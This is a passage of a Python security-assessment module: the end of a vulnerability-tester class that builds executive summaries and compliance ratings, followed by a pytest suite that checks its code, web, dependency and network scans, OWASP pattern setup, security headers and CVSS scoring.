    def _generate_executive_summary(self, vulnerabilities: List[Vulnerability], dependency_vulns: List[DependencyVulnerability], risk_level: str) -> str:
        """Generate executive summary of assessment."""
        total_vulns = len(vulnerabilities) + len(dependency_vulns)
        critical_count = len([v for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL])
        critical_count += len([v for v in dependency_vulns if v.severity == VulnerabilitySeverity.CRITICAL])
        
        high_count = len([v for v in vulnerabilities if v.severity == VulnerabilitySeverity.HIGH])
        high_count += len([v for v in dependency_vulns if v.severity == VulnerabilitySeverity.HIGH])
        
        summary = f"""
        Security Assessment Summary:
        
        Overall Risk Level: {risk_level.upper()}
        Total Vulnerabilities: {total_vulns}
        Critical Issues: {critical_count}
        High-Risk Issues: {high_count}
        
        """
        
        if critical_count > 0:
            summary += "IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found that pose significant security risk.\n"
        elif high_count > 0:
            summary += "HIGH PRIORITY: Multiple high-risk vulnerabilities require prompt attention.\n"
        else:
            summary += "The system shows acceptable security posture with manageable risk levels.\n"
        
        return summary.strip()
    
    def _assess_compliance_impact(self, vulnerabilities: List[Vulnerability]) -> str:
        """Assess compliance impact of vulnerabilities."""
        critical_vulns = [v for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL]
        high_vulns = [v for v in vulnerabilities if v.severity == VulnerabilitySeverity.HIGH]
        
        if critical_vulns:
            return "high"
        elif len(high_vulns) > 3:
            return "medium"
        else:
            return "low"


# Test suite
class TestVulnerabilityAssessment:
    """Test suite for vulnerability assessment."""
    
    @pytest.fixture
    def vuln_tester(self):
        """Create vulnerability assessment tester instance."""
        return VulnerabilityAssessmentTester()
    
    @pytest.fixture
    def test_source_files(self):
        """Test source code files."""
        return ["app.py", "config.py", "auth.py", "database.py"]
    
    @pytest.fixture
    def test_web_urls(self):
        """Test web application URLs."""
        return ["https://api.healthanalytics.com", "https://admin.healthanalytics.com"]
    
    @pytest.fixture
    def test_dependencies(self):
        """Test dependencies."""
        return [
            {"name": "log4j-core", "version": "2.14.1", "type": "direct"},
            {"name": "jackson-databind", "version": "2.9.0", "type": "direct"},
            {"name": "spring-security-core", "version": "5.6.0", "type": "direct"},
            {"name": "safe-library", "version": "1.0.0", "type": "direct"}
        ]
    
    @pytest.fixture
    def test_network_targets(self):
        """Test network targets."""
        return ["web-server.healthanalytics.com", "database-server.internal", "api-server.healthanalytics.com"]
    
    def test_code_vulnerability_scanning(self, vuln_tester, test_source_files):
        """Test source code vulnerability scanning."""
        vulnerabilities = vuln_tester.scan_for_code_vulnerabilities(test_source_files)
        
        # Should detect vulnerabilities in simulated code
        assert len(vulnerabilities) > 0, "Should detect code vulnerabilities"
        
        # Check for specific vulnerability types
        categories = [v.category for v in vulnerabilities]
        assert VulnerabilityCategory.INJECTION in categories, "Should detect injection vulnerabilities"
        assert VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE in categories, "Should detect hardcoded secrets"
        
        # Verify vulnerability structure
        for vuln in vulnerabilities:
            assert vuln.vulnerability_id is not None
            assert vuln.cvss_score >= 0.0
            assert vuln.severity in [s for s in VulnerabilitySeverity]
            assert len(vuln.affected_components) > 0
            assert vuln.remediation_guidance is not None
    
    def test_web_application_security_testing(self, vuln_tester, test_web_urls):
        """Test web application security testing."""
        security_tests = vuln_tester.test_web_application_security(test_web_urls)
        
        # Should perform multiple security tests
        assert len(security_tests) > 0, "Should perform security tests"
        
        # Check for different test categories
        test_categories = [test.test_category for test in security_tests]
        expected_categories = [
            VulnerabilityCategory.INJECTION,
            VulnerabilityCategory.CROSS_SITE_SCRIPTING,
            VulnerabilityCategory.SECURITY_MISCONFIGURATION
        ]
        
        for category in expected_categories:
            assert category in test_categories, f"Should test for {category}"
        
        # Verify test structure
        for test in security_tests:
            assert test.test_id is not None
            assert test.target_endpoint is not None
            assert 0.0 <= test.confidence_level <= 1.0
            assert test.vulnerable in [True, False]
    
    def test_dependency_vulnerability_scanning(self, vuln_tester, test_dependencies):
        """Test dependency vulnerability scanning."""
        dep_vulns = vuln_tester.scan_dependencies_for_vulnerabilities(test_dependencies)
        
        # Should detect known vulnerable dependencies
        assert len(dep_vulns) > 0, "Should detect dependency vulnerabilities"
        
        # Check for specific vulnerable packages
        vulnerable_packages = [dv.package_name for dv in dep_vulns]
        assert any("log4j" in pkg for pkg in vulnerable_packages), "Should detect log4j vulnerability"
        assert any("jackson" in pkg for pkg in vulnerable_packages), "Should detect jackson vulnerability"
        
        # Verify critical vulnerabilities are flagged
        critical_deps = [dv for dv in dep_vulns if dv.severity == VulnerabilitySeverity.CRITICAL]
        assert len(critical_deps) > 0, "Should have critical dependency vulnerabilities"
        
        # Verify vulnerability details
        for dep_vuln in dep_vulns:
            assert dep_vuln.cvss_score > 0.0
            assert dep_vuln.patch_available in [True, False]
            assert len(dep_vuln.fixed_versions) > 0
    
    def test_network_security_testing(self, vuln_tester, test_network_targets):
        """Test network security testing."""
        network_vulns = vuln_tester.test_network_security(test_network_targets)
        
        # Should detect network security issues
        assert len(network_vulns) > 0, "Should detect network vulnerabilities"
        
        # Check for different vulnerability types
        vuln_types = [v.name for v in network_vulns]
        
        # Should detect open ports or SSL issues
        port_issues = [v for v in network_vulns if "Port" in v.name]
        ssl_issues = [v for v in network_vulns if "SSL" in v.name or "TLS" in v.name]
        
        assert len(port_issues) > 0 or len(ssl_issues) > 0, "Should detect network security issues"
        
        # Verify network vulnerability details
        for vuln in network_vulns:
            assert len(vuln.affected_endpoints) > 0
            assert vuln.category == VulnerabilityCategory.SECURITY_MISCONFIGURATION
    
    def test_comprehensive_vulnerability_assessment(self, vuln_tester, test_source_files, 
                                                  test_web_urls, test_dependencies, test_network_targets):
        """Test comprehensive vulnerability assessment."""
        assessment = vuln_tester.conduct_comprehensive_vulnerability_assessment(
            test_source_files, test_web_urls, test_dependencies, test_network_targets
        )
        
        # Verify assessment structure
        assert isinstance(assessment, VulnerabilityAssessment)
        assert assessment.assessment_id is not None
        assert assessment.scan_duration_minutes >= 0
        assert assessment.overall_risk_score >= 0.0
        assert assessment.risk_level in ["critical", "high", "medium", "low", "minimal"]
        
        # Should find vulnerabilities
        assert len(assessment.vulnerabilities_found) > 0, "Should find vulnerabilities"
        assert len(assessment.dependency_vulnerabilities) > 0, "Should find dependency vulnerabilities"
        assert len(assessment.security_tests_performed) > 0, "Should perform security tests"
        
        # Should have remediation guidance
        assert len(assessment.remediation_priorities) > 0, "Should provide remediation priorities"
        assert assessment.executive_summary is not None, "Should provide executive summary"
        
        # Verify technical details
        technical_details = assessment.technical_details
        assert "code_vulnerabilities" in technical_details
        assert "network_vulnerabilities" in technical_details
        assert "dependency_vulnerabilities" in technical_details
        assert "scan_scope" in technical_details
    
    def test_vulnerability_patterns_configuration(self, vuln_tester):
        """Test vulnerability patterns are properly configured."""
        patterns = vuln_tester.owasp_top10_patterns
        
        # Verify OWASP Top 10 categories are covered
        owasp_categories = [
            VulnerabilityCategory.INJECTION,
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE,
            VulnerabilityCategory.SECURITY_MISCONFIGURATION
        ]
        
        for category in owasp_categories:
            assert category in patterns, f"Should have patterns for {category}"
            assert len(patterns[category]) > 0, f"Should have patterns defined for {category}"
            
            # Verify pattern structure
            for pattern_info in patterns[category]:
                assert "pattern" in pattern_info, "Pattern should have regex pattern"
                assert "description" in pattern_info, "Pattern should have description"
    
    def test_test_payloads_configuration(self, vuln_tester):
        """Test attack payloads are properly configured."""
        payloads = vuln_tester.test_payloads
        
        # Verify key attack categories have payloads
        payload_categories = [
            VulnerabilityCategory.INJECTION,
            VulnerabilityCategory.CROSS_SITE_SCRIPTING,
            VulnerabilityCategory.BROKEN_ACCESS_CONTROL
        ]
        
        for category in payload_categories:
            assert category in payloads, f"Should have payloads for {category}"
            assert len(payloads[category]) > 0, f"Should have test payloads for {category}"
            
            # Verify payloads are strings
            for payload in payloads[category]:
                assert isinstance(payload, str), "Payload should be string"
                assert len(payload) > 0, "Payload should not be empty"
    
    def test_known_vulnerable_dependencies_database(self, vuln_tester):
        """Test known vulnerable dependencies database."""
        known_vulns = vuln_tester.known_vulnerable_dependencies
        
        # Verify critical vulnerabilities are included
        critical_packages = ["log4j", "jackson-databind", "spring-security"]
        for package in critical_packages:
            assert package in known_vulns, f"Should include known vulnerable package: {package}"
            
            vuln_info = known_vulns[package]
            assert "vulnerable_versions" in vuln_info
            assert "cve" in vuln_info
            assert "severity" in vuln_info
            assert "cvss_score" in vuln_info
            assert "description" in vuln_info
            
            # Verify severity and score alignment
            if vuln_info["severity"] == VulnerabilitySeverity.CRITICAL:
                assert vuln_info["cvss_score"] >= 9.0, "Critical vulnerabilities should have CVSS >= 9.0"
    
    def test_security_headers_configuration(self, vuln_tester):
        """Test security headers configuration."""
        headers = vuln_tester.required_security_headers
        
        # Verify essential security headers are required
        essential_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        for header in essential_headers:
            assert header in headers, f"Should require security header: {header}"
            assert headers[header] is not None, f"Header {header} should have expected value"
    
    def test_cvss_scoring_accuracy(self, vuln_tester):
        """Test CVSS scoring accuracy."""
        # Test different vulnerability categories
        test_categories = [
            VulnerabilityCategory.INJECTION,
            VulnerabilityCategory.SENSITIVE_DATA_EXPOSURE,
            VulnerabilityCategory.CROSS_SITE_SCRIPTING
        ]
        
        for category in test_categories:
            cvss_score = vuln_tester._calculate_cvss_score(category)
            severity = vuln_tester._determine_severity_from_category(category)
            
            # Verify score aligns with severity
            if severity == VulnerabilitySeverity.CRITICAL:
                assert cvss_score >= 9.0, f"Critical severity should have CVSS >= 9.0 for {category}"
            elif severity == VulnerabilitySeverity.HIGH:
                assert cvss_score >= 7.0, f"High severity should have CVSS >= 7.0 for {category}"
            elif severity == VulnerabilitySeverity.MEDIUM:
                assert 4.0 <= cvss_score < 7.0, f"Medium severity should have CVSS 4.0-6.9 for {category}"


if __name__ == "__main__":
    # Run tests with verbose output
    pytest.main([__file__, "-v", "--tb=short"])